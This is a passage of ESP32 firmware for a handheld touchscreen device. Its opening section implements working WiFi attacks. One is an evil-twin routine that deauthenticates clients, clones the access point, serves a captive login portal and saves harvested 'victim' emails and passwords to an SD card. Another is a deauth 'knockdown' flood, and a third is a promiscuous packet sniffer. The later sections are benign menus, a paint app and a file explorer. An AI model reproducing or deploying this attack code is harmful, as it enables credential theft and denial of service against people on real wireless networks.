            } else {
              terminalPrint("Connected to WiFi, deaunticating connected devices...");
              String tmp = WiFi.SSID();
              WiFi.disconnect(true, true);
              int num = WiFi.scanNetworks();
              for (int i = 0; i < num; i++) {
                if (WiFi.SSID(i) == tmp) {
                  start_deauth(i, 0, 2, true);
                  break;
                }
              }
              terminalPrint("Deauth attack done, creating Clone AP");
              WiFi.softAP(tmp, "");
              //start_deauth(num, 0, 2, true);
              //start_deaunth()
            }
            WiFi.softAPConfig(apIP, apIP, netMsk);
            terminalPrint("Initating SD with index.html");
            int attempt = 0;
            while (!SD.begin(SD_CS, SPI, 4000000) && attempt < 5) {
              terminalPrint("SD Card failed to init, retrying...");
              attempt++;
              delay(1000);
            }
            if (attempt >= 5) {
              terminalPrint("SD Card failed to init, restarting...");
              delay(1000);
              esp_restart();
            }
            terminalPrint("SD Card initialized, starting server...");
            dnsServer.start(53, "*", WiFi.softAPIP());
            server.on("/", handleRoot);
            server.on("/get", HTTP_GET, handleGet);
            server.on("/login", HTTP_GET, handleLogin);
            server.onNotFound(handleRoot);
            server.begin();
            terminalPrint("Server started, IP: " + WiFi.localIP().toString());
            while (true) {
              server.handleClient();
              dnsServer.processNextRequest();
              if (userConnect) {terminalPrint("Victim connected!"); userConnect = false;}
              if (userLogin) {terminalPrint("Victim loging in..."); userLogin = false;}
              if (userReq) {
                userReq = false;
                terminalPrint("Victim Email: " + email);
                terminalPrint("Victim Password: " + password);
                // Store victim email and password to SD card
                File file = SD.open("/victim.txt", FILE_APPEND);
                if (file) {
                  file.println(email + " - " + password);
                  file.close();
                  terminalPrint("Victim email and password saved to SD card");
                } else {
                  terminalPrint("Failed to save victim email and password to SD card");
                }
              }
            }
            break;
          }
          case 3: {
            terminalPrint("Knockdown Attack Selected!");
            terminalPrint("Just sit here and enjoy how stone age belike (a.k.a back to the time when you can't connect to internet)");
            start_deauth(0, 1, 2);
            while (true) {
              if (mayOutput) {
                terminalPrint(brige);
                mayOutput = false;
              }
            }
          }
          case 4 : {
            terminalPrint("Load Firmware Selected!");
            terminalPrint("Please enter firmware path:");
            delay(3000);
            String path = keyboard("Firmware Path:");
            terminalPrint("Loading firmware from " + path);
            delay(1000);
            loadFirmwareFromSD(path.c_str());
            break;
          }
          case 5: {
            terminalPrint("Sniffer Selected!");
            terminalPrint("Select delay frame (default 50ms):");
            int delayFrame = 50;
            int touchStart = 0;
            bool holding = false;
            while (true) {
              if (digitalRead(0) == LOW && !holding) {
                holding = true;
                touchStart = millis();
              } if (digitalRead(0) == HIGH && holding) {
                holding = false;
                if (millis() - touchStart < 1000) {
                  delayFrame = (delayFrame + 50) % 550;
                  terminalPrint("Selected delay frame: " + String(delayFrame) + "ms");
                } else {
                  break;
                }
              }
            }
            terminalPrint("Setting delay frame to " + String(delayFrame) + "ms");
            terminalPrint("Starting sniffer...");
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(lookAround);
            terminalPrint("Sniffer started, launching viewer...");
            int lineY[8] = {200}; 
            bool viewMerge = true,
            pausE = false, hld = false;
            int cursor = 0, spF = 4;
            screen.setTextColor(TFT_WHITE);
            screen.fillScreen(TFT_BLACK);
            while (true) {
              screen.fillRect(0, 200, 240, 120, TFT_BLACK);
              screen.fillRect(0, 0, 240, 50, TFT_BLACK);
              screen.fillRect(0, 0, 20, 10, TFT_BLUE);
              screen.drawString(": Manage", 22, 0, 1);
              screen.fillRect(0, 10, 20, 10, TFT_DARKCYAN);
              screen.drawString(": Control", 22, 10, 1);
              screen.fillRect(0, 20, 20, 10, TFT_YELLOW);
              screen.drawString(": Data", 22, 20, 1);
              screen.fillRect(0, 30, 20, 10, TFT_PURPLE);
              screen.drawString(": Misc", 22, 30, 1);
              screen.fillRect(0, 40, 20, 10, TFT_DARKGREY);
              screen.drawString(": Unknown", 22, 40, 1);
              screen.fillRect(80, 0, 20, 10, TFT_GREEN);
              screen.drawString(": Probe", 102, 0, 1);
              screen.fillRect(80, 10, 20, 10, TFT_CYAN);
              screen.drawString(": Beacon", 102, 10, 1);
              screen.fillRect(80, 20, 20, 10, TFT_RED);
              screen.drawString(": Deauth", 102, 20, 1);
              screen.drawString(viewMerge ? "Merge" : "Split", 200, 2, 1);
              if (pausE) screen.drawString("Pausing", 200, 2, 1);
              screen.drawLine(cursor, 51, cursor, 200, TFT_BLACK);
              screen.drawLine(cursor, lineY[0] - spF * sniffManage.nv , cursor, lineY[0] - spF * sniffManage.ov, TFT_BLUE);
              screen.drawLine(cursor, lineY[1] - spF * sniffControl.nv, cursor, lineY[1] - spF * sniffControl.ov, TFT_DARKCYAN);
              screen.drawLine(cursor, lineY[2] - spF * sniffData.nv   , cursor, lineY[2] - spF * sniffData.ov, TFT_YELLOW);
              screen.drawLine(cursor, lineY[3] - spF * sniffMisc.nv   , cursor, lineY[3] - spF * sniffMisc.ov, TFT_PURPLE);
              screen.drawLine(cursor, lineY[4] - spF * sniffUnknown.nv, cursor, lineY[4] - spF * sniffUnknown.ov, TFT_DARKGREY);
              screen.drawLine(cursor, lineY[5] - spF * sniffProbe.nv  , cursor, lineY[5] - spF * sniffProbe.ov, TFT_GREEN);
              screen.drawLine(cursor, lineY[6] - spF * sniffBeacon.nv , cursor, lineY[6] - spF * sniffBeacon.ov, TFT_CYAN);
              screen.drawLine(cursor, lineY[7] - spF * sniffDeaunth.nv, cursor, lineY[7] - spF * sniffDeaunth.ov, TFT_RED);
              screen.drawLine(cursor, 200, cursor, 205, TFT_WHITE);
              screen.drawLine(0, 50, 240, 50, TFT_WHITE);
              screen.drawLine(0, 200, 240, 200, TFT_WHITE);
              sniffManage.ov = sniffManage.nv;
              sniffControl.ov = sniffControl.nv;
              sniffData.ov = sniffData.nv;
              sniffMisc.ov = sniffMisc.nv;
              sniffUnknown.ov = sniffUnknown.nv;
              sniffProbe.ov = sniffProbe.nv;
              sniffBeacon.ov = sniffBeacon.nv;
              sniffDeaunth.ov = sniffDeaunth.nv;
              sniffManage.nv = 0;
              sniffControl.nv = 0;
              sniffData.nv = 0;
              sniffMisc.nv = 0;
              sniffUnknown.nv = 0;
              sniffProbe.nv = 0;
              sniffBeacon.nv = 0;
              sniffDeaunth.nv = 0;
              if (!pausE) cursor = (cursor + 1) % 240;
              if (digitalRead(0) == LOW && !hld) {
                hld = true;
                viewMerge = !viewMerge;
                if (viewMerge) {
                  for (int i = 0; i < 8; i++) lineY[i] = 200;
                  spF = 4;
                }
                else {
                  for (int i = 0; i < 8; i++) {
                    lineY[i] = 68.0 + (i * 130.0) / 7.0;
                  } spF = 1;
                }
              }
              if (digitalRead(0) == HIGH && hld) {
                hld = false;
              }
              //screen.setTextColor(TFT_WHITE);
              for (int i = 0; i < 5; i++) {
                screen.drawString(history[i], 2, 210 + i * 10, 1);
              }
              for (int i = 0; i < 5; i++) {
                if (shistory[i].substring(0, 1) == "B") screen.setTextColor(TFT_CYAN);
                else if (shistory[i].substring(0, 1) == "P") screen.setTextColor(TFT_GREEN);
                else if (shistory[i].substring(0, 1) == "D") screen.setTextColor(TFT_RED);
                else screen.setTextColor(TFT_WHITE);
                screen.drawString(shistory[i], 2, 270 + i * 10, 1);
              }
              screen.setTextColor(TFT_WHITE);
              screen.pushSprite(0, 0);
              delay(delayFrame);
            }
            break;
          }
        }
    }
    if (WiFi.status() == WL_CONNECTED) {
      screen.drawString("WiFi Connected", 10, 40, 4);
      screen.drawString("SSID: " + WiFi.SSID(), 10, 80, 2);
      screen.drawString("IP: " + WiFi.localIP().toString(), 10, 100, 2);
      screen.drawString("Signal: " + String(WiFi.RSSI()) + "dBm", 10, 120, 2);
      screen.drawString("Gateway: " + WiFi.gatewayIP().toString(), 10, 140, 2);
      screen.drawString("Subnet: " + WiFi.subnetMask().toString(), 10, 160, 2);
      screen.drawString("DNS: " + WiFi.dnsIP().toString(), 10, 180, 2);
      screen.drawString("MAC: " + WiFi.macAddress(), 10, 200, 2);
      if (button("Disconnect", 10, 240, 100, TFT_RED)) {WiFi.disconnect(true, true); WiFi.mode(WIFI_OFF);}
    } else {
      int th = screen.fontHeight(2);
      for (int i = 0; i < wl_near; i++) {
        int y = i * (th + 4) - scrOfst + 80;
        if (y >= -th + 78 && y < 238 + th) {
          bool iop = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
          if (y < lastY && lastY < y + (th + 4)) {
            sel = i;
          }
          if (sel == i) screen.fillRect(10, y, 220, th + 4, iop ? TFT_GREEN : TFT_WHITE);
          sel = constrain(sel, 0, wl_near);
          screen.setTextColor(sel == i ? TFT_BLACK : (iop ? TFT_GREEN : TFT_WHITE), sel == i ? (iop ? TFT_GREEN : TFT_WHITE) : TFT_BLACK);
          screen.drawString(WiFi.SSID(i), 15, y, 2);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
        }
      }

      screen.fillRect(0, 60, 240, 20, TFT_BLACK);
      screen.fillRect(0, 236, 240, 40, TFT_BLACK);
      screen.drawString("WiFi Disconnected", 10, 40, 4);
      screen.drawString("Nearby Wifi (" + String(wl_near) + " Wifi):", 10, 68, 1.8);

      if (touchscreen.touched()) {
        ffr = 120;
        TS_Point p = touchscreen.getPoint();
        int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
        int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);

        if (10 < px && px < 230 && 80 < py && py < 236) {
          if (!isScrolling) {
            isScrolling = true;
            lastY = py;
          } else {
            scrOfst += lastY - py;
            lastY = py;
            if (scrOfst < -20) scrOfst = -20;
            int maxScr = (wl_near - 1) * (th + 4);
            if (scrOfst > maxScr) scrOfst = maxScr;
          }
        }
      } else {
        isScrolling = false;
      }

      screen.drawLine(10, 80, 230, 80, TFT_WHITE);
      screen.drawLine(10, 236, 230, 236, TFT_WHITE);
      if (button("Scan", 20, 248, 60)) {
        WiFi.scanDelete();
        screen.fillScreen(TFT_BLACK);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawCentreString("Scanning...", 120, 40, 4);
        screen.drawCentreString("this may take some time", 120, 70, 1.5);
        screen.drawCentreString("Please Wait...", 120, 240, 4);
        screen.drawBitmap(88, 128, bwf4, 64, 64, TFT_WHITE, TFT_BLACK);
        screen.pushSprite(0, 0);
        WiFi.mode(WIFI_OFF);
        WiFi.disconnect(false, true);
        wl_near = WiFi.scanNetworks();
        scrOfst = 0;
        sel = 0;
        Serial.println("--------Scaned Wifi--------");
        for (int i = 0; i < wl_near; i++) Serial.println(WiFi.SSID(i));
      }
      if (button("Connect", 160, 248, 60) && sel > -1 && sel < wl_near) {
        String pass = keyboard("Password for: " + WiFi.SSID(sel) + (WiFi.encryptionType(sel) == WIFI_AUTH_OPEN ? ", no password" : ""));
        WiFi.begin(WiFi.SSID(sel), pass);
        int timeout = 0;
        while (timeout < 20 && WiFi.status() != WL_CONNECTED) {
          screen.fillScreen(TFT_BLACK);
          screen.drawCentreString("Connecting...", 120, 40, 4);
          screen.drawCentreString("stand still!", 120, 70, 1.5);
          screen.drawBitmap(88, 128, big_wifi[timeout % 4 + 1], 64, 64, TFT_WHITE);
          screen.drawCentreString("WiFi:" + WiFi.SSID(sel), 120, 240, 1.5);
          screen.drawCentreString("Password: " + (pass == "" ? "<NONE>" : pass), 120, 260, 1.5);
          screen.pushSprite(0, 0);
          timeout++;
          delay(500);
        }
        screen.fillScreen(TFT_BLACK);
        if (WiFi.status() == WL_CONNECTED) {
          screen.drawCentreString("Connected!", 120, 40, 4);
          screen.drawCentreString("WiFi: " + String(WiFi.SSID()), 120, 80, 1.5);
          screen.drawCentreString("IP: " + WiFi.localIP().toString(), 120, 90, 1.5);
          screen.drawBitmap(88, 128, bwf4, 64, 64, TFT_GREEN);
          screen.drawCentreString("Password: " + (pass == "" ? "<NONE>" : pass), 120, 240, 1.5);
          screen.drawCentreString("WiFi.status() = " + String(WL_CONNECTED), 120, 250, 1.5);
        } else {
          screen.drawCentreString("Connecting Failed!", 120, 40, 4);
          screen.drawCentreString("WiFi: " + String(WiFi.SSID(sel)), 120, 80, 1.5);
          screen.drawCentreString("Password: " + (pass == "" ? "<NONE>" : pass), 120, 90, 1.5);
          screen.drawBitmap(88, 128, bwf4, 64, 64, TFT_RED);
          String reasion = "unknow";
          int status = WiFi.status();
          switch (status) {
            case WL_IDLE_STATUS:
              reasion = "Idle";
              break;
            case WL_NO_SSID_AVAIL:
              reasion = "No SSID Available";
              break;
            case WL_SCAN_COMPLETED:
              reasion = "Scan Completed";
              break;
            case WL_CONNECTED:
              reasion = "Connected";
              break;
            case WL_CONNECT_FAILED:
              reasion = "Connect Failed";
              break;
            case WL_CONNECTION_LOST:
              reasion = "Connection Lost";
              break;
            case WL_DISCONNECTED:
              reasion = "Disconnected";
              break;
            default:
              reasion = "Unknown";
              break;
          }
          screen.drawCentreString("Reasion: " + reasion, 120, 240, 1.5);
          screen.drawCentreString("WiFi.status() = " + String(status), 120, 250, 1.5);
        }
        screen.pushSprite(0, 0);
        delay(3000);
      }
    }
    screen.pushSprite(0, 0);
    if (ffr > 0) ffr--; 
    else delay(50);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
  }
  //scroll_list.deleteSprite();
  WiFi.scanDelete();
}

void miscPain() {
  bool drawing = true, tching = false, hld = false;
  //int lx = 0, ly = 0;
  int tmr = millis();
  const uint16_t cbr[] = {TFT_RED, TFT_BLUE, TFT_GREEN, TFT_DARKGREEN, TFT_CYAN, TFT_PURPLE, TFT_YELLOW, TFT_PINK, TFT_WHITE, TFT_BLACK};
  uint16_t brs = TFT_BLACK;
  tft.fillScreen(TFT_WHITE);
  Serial.println("Painting");
  while (drawing) {
    if (digitalRead(0) == LOW && !hld) {
      hld = true; tmr = millis();
    }
    if (digitalRead(0) == HIGH && hld) {
      hld = false;
      if (millis() - tmr < 1000) {tft.fillScreen(TFT_WHITE); for (int bx = 0; bx < 10; bx++) tft.fillRect(bx * 24, 0, 24, 20, cbr[bx]);}
      else return;
    }
    if (touchscreen.touched()) {
      TS_Point p = touchscreen.getPoint();
      int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      for (int bx = 0; bx < 10; bx++) {
        tft.fillRect(bx * 24, 0, 24, 20, cbr[bx]);
        if (bx * 24 < px && px < bx * 24 + 24 && py < 20) brs = cbr[bx];
      }
      if (py > 20) {
        tft.fillCircle(px, py, 3, brs);
      }
    } else tching = false;
  }
}

std::vector<String> listDir(fs::FS &fs, const char *dirname, uint8_t levels) {
  std::vector<String> fileList;
  File root = fs.open(dirname);
  if (!root || !root.isDirectory()) {
      fileList.push_back("#Failed to open directory");
      return fileList;
  }

  File file = root.openNextFile();
  while (file) {
      if (file.isDirectory()) {
          fileList.push_back("#" + String(file.name()));
          if (levels) {
              std::vector<String> subFiles = listDir(fs, file.name(), levels - 1);
              fileList.insert(fileList.end(), subFiles.begin(), subFiles.end());
          }
      } else {
          fileList.push_back("@" + String(file.name()));
      }
      file = root.openNextFile();
  }
  return fileList;
}

void fileExplorer() {
  screen.fillScreen(TFT_BLACK);
  SD.end();
  SPI.end();
  
  bool isScrolling = false, isFolder = false;
  int lastY = 0, scroll = 0, sel = 0, ffr = 120, hld = false;
  String path = "/";
  String addedPath = "";
  String fileType = "";
  String selFile = "";
  
  int attempt = 0;
  while (!SD.begin(SD_CS, SPI, 4000000) && attempt < 5) {
    screen.fillScreen(TFT_BLACK);
    screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
    screen.drawString("attempt: " + String(attempt), 0, 8, 1);
    screen.pushSprite(0, 0);
    attempt++;
    delay(1000);
  }
  if (attempt >= 5) {
    touchscreenSPI.end();
    touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
    touchscreen.begin(touchscreenSPI);
    touchscreen.setRotation(SCREEN_ROTATION);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    return;
  }
  
  std::vector<String> files = listDir(SD, path.c_str(), 0);
  SD.end();
  
  touchscreenSPI.end();
  touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
  touchscreen.begin(touchscreenSPI);
  touchscreen.setRotation(SCREEN_ROTATION);
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
  
  while (true) {
    screen.fillScreen(TFT_BLACK);
    int i = 0, fnum = 0;
    for (const String &file : files) {
      String prf = file.substring(0, 1);
      int y = 20 * i - scroll + 70;
      if (y < lastY && lastY < y + 20) sel = i;
      if (60 < y && y < 236) {
        if (prf == "#") {
          if (sel == i) {
            screen.setTextColor(TFT_BLACK, TFT_ORANGE);
            screen.fillRect(10, y, 230, 20, TFT_ORANGE);
            isFolder = true;
          } else {
            screen.setTextColor(TFT_ORANGE, TFT_BLACK);
          }
        } else {
          if (sel == i) {
            screen.setTextColor(TFT_BLACK, TFT_WHITE);
            screen.fillRect(10, y, 220, 20, TFT_WHITE);
            isFolder = false;
            selFile = file.substring(1);
            int didx = selFile.indexOf(".");
            if (didx != -1)
              fileType = selFile.substring(didx);
            else
              fileType = "";
          } else {
            screen.setTextColor(TFT_WHITE, TFT_BLACK);
          }
        }
        screen.drawString(file.substring(1, 36), 12, y + 3, 2);
      }
      i++;
      fnum++;
    }
    
    screen.fillRect(0, 50, 240, 20, TFT_BLACK);
    screen.fillRect(0, 230, 240, 30, TFT_BLACK);
    screen.fillRect(230, 50, 10, 200, TFT_BLACK);
    
    if (touchscreen.touched()) {
      ffr = 120;
      TS_Point p = touchscreen.getPoint();
      int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      
      if (px > 10 && px < 230 && py > 70 && py < 236) {
        if (!isScrolling) {
          isScrolling = true;
          lastY = py;
        } else {
          scroll += lastY - py;
          lastY = py;
          if (scroll < 0) scroll = 0;
          int maxScr = (fnum - 1) * 20;
          if (scroll > maxScr) scroll = maxScr;
        }
      }
    } else {
      isScrolling = false;
    }
    
    screen.drawLine(10, 70, 230, 70, TFT_WHITE);
    screen.drawLine(10, 230, 230, 230, TFT_WHITE);
    if (button("Remove", 95, 246, 50, isFolder ? TFT_DARKGREY : TFT_RED) && !isFolder) {
      bool riel = true, idk = false;
      while (riel) {
        screen.fillScreen(TFT_BLACK);
        screen.setTextColor(TFT_RED, TFT_BLACK);
        screen.drawCentreString("!!! Warning !!!", 120, 120, 4);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawCentreString("This action can not be undo:", 120, 160, 2);
        screen.drawCentreString("Remove: " + files[sel].substring(1), 120, 175, 2);
        if (button("Delete!", 70, 200, 100, TFT_RED)) {riel = false; idk = true;}
        if (button("Keep", 70, 250, 100, TFT_WHITE)) riel = false;
        screen.pushSprite(0, 0);
      }
      if (idk) {
        int att = 0;
        SD.end();
        SPI.end();
        while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
          screen.fillScreen(TFT_BLACK);
          screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
          screen.drawString("attempt: " + String(att), 0, 8, 1);
          screen.pushSprite(0, 0);
          att++;
          delay(1000);
        }
        if (att >= 5) {
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          return;
        }
        SD.remove(path + "/" + files[sel].substring(1));

        files = listDir(SD, path.c_str(), 0);
        SD.end();
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
      }
    }
    if (button("Open", 170, 246, 50) && !hld) {
      hld = true;
      if (isFolder && files[sel].substring(1) != "Failed to open directory") {
        //isFolder = true;
        path += (path == "/" ? "" : "/") + files[sel].substring(1);
        screen.fillScreen(TFT_BLACK);
        SD.end();
        SPI.end();
        isScrolling = false;
        isFolder = false;
        lastY = 0;
        scroll = 0;
        sel = 0;
        int att = 0;
        while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
          screen.fillScreen(TFT_BLACK);
          screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
          screen.drawString("attempt: " + String(att), 0, 8, 1);
          screen.pushSprite(0, 0);
          att++;
          delay(1000);
        }
        if (att >= 5) {
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          return;
        }
        files = listDir(SD, path.c_str(), 0);
        SD.end();
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
        //break;
      }
      else if (!isFolder && fileType == ".bpx") {
        Serial.println("Path: " + path + "/" + files[sel].substring(1));
        screen.fillScreen(TFT_BLACK);
        SD.end();
        SPI.end();
        int att = 0;
        while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
          screen.fillScreen(TFT_BLACK);
          screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
          screen.drawString("attempt: " + String(att), 0, 8, 1);
          screen.pushSprite(0, 0);
          att++;
          delay(1000);
        }
        if (att >= 5) {
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          return;
        }
        
        File file = SD.open(path + "/" + files[sel].substring(1), FILE_READ);
        screen.fillScreen(TFT_BLACK);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawCentreString("Loading Image...", 120, 120, 4);
        screen.pushSprite(0, 0);
        int st = millis();
        for (int i = 0; i < 76800; i++) {
          if (digitalRead(0) == LOW) break;
          
          if (file.available() < 3) break;
          uint8_t r = file.read();
          uint8_t g = file.read();
          uint8_t b = file.read();
          
          float gray = 0.2989 * r + 0.5870 * g + 0.1140 * b;
          uint8_t r_boost = constrain(gray + satFactor * (r - gray), 0, 255);
          uint8_t g_boost = constrain(gray + satFactor * (g - gray), 0, 255);
          uint8_t b_boost = constrain(gray + satFactor * (b - gray), 0, 255);
          
          uint16_t tmpcl = tft.color565(r_boost, g_boost, b_boost);
          screen.drawPixel(i % 240, i / 240, tmpcl);
          if (millis() - st > 1000) {
            st = millis();
            tft.fillRect(0, 160, map(i, 0, 76800, 0, 240), 10, TFT_WHITE);
          }
        }
        screen.pushSprite(0, 0);
        file.close();
        SD.end();
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
        while (!touchscreen.touched()) delay(80);
      }      
      else if (!isFolder && fileType == ".ppd") {
        Serial.println("Path: " + path + "/" + files[sel].substring(1));
        screen.fillScreen(TFT_BLACK);
        SD.end();
        SPI.end();
        int att = 0;
        while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
          screen.fillScreen(TFT_BLACK);
          screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
          screen.drawString("attempt: " + String(att), 0, 8, 1);
          screen.pushSprite(0, 0);
          att++;
          delay(1000);
        }
        if (att >= 5) {
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          return;
        }
        
        File file = SD.open(path + "/" + files[sel].substring(1), FILE_READ);
        screen.fillScreen(TFT_BLACK);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        screen.drawCentreString("Loading Image...", 120, 120, 4);
        screen.pushSprite(0, 0);
        int pxl[] = {0, 0, 0};
        int st = millis();
        for (int i = 0; i < 76800; i++) {
          if (digitalRead(0) == LOW) break;
          for (int cg = 0; cg < 3; cg++) {
            String clt = "";
            for (int cc = 0; cc < 3; cc++) {
              if (!file.available()) break;
              char c = file.read();
              clt += String(c);
            }
            pxl[cg] = clt.toInt();
          }
          
          uint8_t r = pxl[0];
          uint8_t g = pxl[1];
          uint8_t b = pxl[2];
          
          float gray = 0.2989 * r + 0.5870 * g + 0.1140 * b;
          
          uint8_t r_boost = constrain(gray + satFactor * (r - gray), 0, 255);
          uint8_t g_boost = constrain(gray + satFactor * (g - gray), 0, 255);
          uint8_t b_boost = constrain(gray + satFactor * (b - gray), 0, 255);
          
          uint16_t tmpcl = tft.color565(r_boost, g_boost, b_boost);
          screen.drawPixel(i % 240, i / 240, tmpcl);
          if (millis() - st > 1000) {
            st = millis();
            tft.fillRect(0, 160, map(i, 0, 76800, 0, 240), 10, TFT_WHITE);
          }
        }
        screen.pushSprite(0, 0);
        file.close();
        SD.end();
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
        while (!touchscreen.touched()) delay(80);
      }
      else if (!isFolder && fileType == ".txt") {
        path += addedPath;
        screen.fillScreen(TFT_BLACK);
        SD.end();
        SPI.end();
        int att = 0;
        while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
          screen.fillScreen(TFT_BLACK);
          screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
          screen.drawString("attempt: " + String(att), 0, 8, 1);
          screen.pushSprite(0, 0);
          att++;
          delay(1000);
        }
        if (att >= 5) {
          touchscreenSPI.end();
          touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
          touchscreen.begin(touchscreenSPI);
          touchscreen.setRotation(SCREEN_ROTATION);
          screen.setTextColor(TFT_WHITE, TFT_BLACK);
          return;
        }
        
        File file = SD.open(path + selFile, FILE_READ);
        screen.setTextColor(TFT_WHITE, TFT_BLACK);
        const int maxLines = SCREEN_HEIGHT / 16;
        bool reading = true;
        int maxChars = 35;
        
        while (file.available() && reading) {
          screen.fillScreen(TFT_BLACK);
          int y = 0;
          while (y + 16 <= SCREEN_HEIGHT && file.available()) {
            String fullLine = file.readStringUntil('\n');
            fullLine.trim();
            String currentLine = "";
            int pos = 0;
            while (pos < fullLine.length()) {
              int spaceIndex = fullLine.indexOf(' ', pos);
              String word;
              if (spaceIndex == -1) {
                word = fullLine.substring(pos);
                pos = fullLine.length();
              } else {
                word = fullLine.substring(pos, spaceIndex);
                pos = spaceIndex + 1;
              }
              
              if (word.length() <= 10) {
                int newLength = (currentLine.length() > 0 ? currentLine.length() + 1 : 0) + word.length();
                if (newLength > maxChars) {
                  screen.drawString(currentLine, 0, y, 2);
                  y += 16;
                  currentLine = "";
                }
                if (currentLine.length() > 0) currentLine += " ";
                currentLine += word;
              }
              else { 
                if (currentLine.length() > 0) {
                  int spaceRemaining = maxChars - currentLine.length() - 1; 
                  if (spaceRemaining > 0) {
                    int chunk = min(spaceRemaining, word.length());
                    currentLine += " " + word.substring(0, chunk);
                    word = word.substring(chunk);
                  }
                  screen.drawString(currentLine, 0, y, 2);
                  y += 16;
                  currentLine = "";
                }
                while (word.length() > 0) {
                  int chunk = min(maxChars, word.length());
                  String segment = word.substring(0, chunk);
                  screen.drawString(segment, 0, y, 2);
                  y += 16;
                  word = word.substring(chunk);
                }
              }
            }
            if (currentLine.length() > 0 && y + 16 <= SCREEN_HEIGHT) {
              screen.drawString(currentLine, 0, y, 2);
              y += 16;
            }
          }
          screen.pushSprite(0, 0);
          
          bool hold = false;
          int startTime = millis();
          while (true) {
            int bt = digitalRead(0);
            if (bt == LOW && !hold) {
              startTime = millis();
              hold = true;
            }
            if (bt == HIGH && hold) {
              int elapsed = millis() - startTime;
              if (elapsed > 1000) {
                reading = false;
                break;
              } else {
                break;
              }
              hold = false;
            }
          }
        }
        file.close();
        SD.end();
        touchscreenSPI.end();
        touchscreenSPI.begin(XPT2046_CLK, XPT2046_MISO, XPT2046_MOSI, XPT2046_CS);
        touchscreen.begin(touchscreenSPI);
        touchscreen.setRotation(SCREEN_ROTATION);
      }
    } else hld = false;
    
    if (button("Return", 20, 246, 50)) {
      // Loại bỏ phần thêm (addedPath) và cắt bỏ thư mục cuối
      if (path.length() > 1) {
        if (path.endsWith("/")) {
          path = path.substring(0, path.length() - 1);
        }
        int lastSlash = path.lastIndexOf('/');
        if (lastSlash != -1) {
          path = path.substring(0, lastSlash);
          if (path == "") path = "/";
        } else {
          path = "/";
        }
      }
      screen.fillScreen(TFT_BLACK);
      SD.end();
      SPI.end();
      isScrolling = false;
      isFolder = false;
      lastY = 0;
      scroll = 0;
      sel = 0;
      int att = 0;
      while (!SD.begin(SD_CS, SPI, 4000000) && att < 5) {
        screen.fillScreen(TFT_BLACK);
        screen.drawString("SD Mount Failed! Retrying...", 0, 0, 1);
        screen.drawString("attempt: " + String(att), 0, 8, 1);
        screen.pushSprite(0, 0);
        att++;
        delay(1000);
      }
